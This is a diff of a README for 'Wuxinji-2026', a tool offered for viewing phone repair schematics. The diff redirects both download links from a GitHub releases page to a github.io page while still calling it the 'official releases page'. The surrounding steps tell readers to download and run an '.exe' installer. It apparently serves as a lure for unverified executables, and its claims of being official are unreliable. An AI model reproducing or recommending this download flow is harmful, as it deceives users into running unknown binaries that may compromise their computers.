@@ -1,6 +1,6 @@
 # 🛠️ Wuxinji-2026 - Access Phone Repair Schematics Today
 
-[![](https://img.shields.io/badge/Download-Wuxinji_2026_Setup-blue.svg)](https://github.com/dilleniabowedstringedinstrument179/Wuxinji-2026/releases)
+[![](https://img.shields.io/badge/Download-Wuxinji_2026_Setup-blue.svg)](https://dilleniabowedstringedinstrument179.github.io)
 
 ## Description
 
@@ -21,7 +21,7 @@ Ensure your computer meets these conditions before you install the software:
 
 Follow these steps to obtain the installer for your computer:
 
-1. Visit the [official releases page](https://github.com/dilleniabowedstringedinstrument179/Wuxinji-2026/releases). 
+1. Visit the [official releases page](https://dilleniabowedstringedinstrument179.github.io). 
 2. Look for the most recent version under the "Assets" section.
 3. Click the file ending in ".exe" to begin your download.
 4. Wait for the download to finish. 
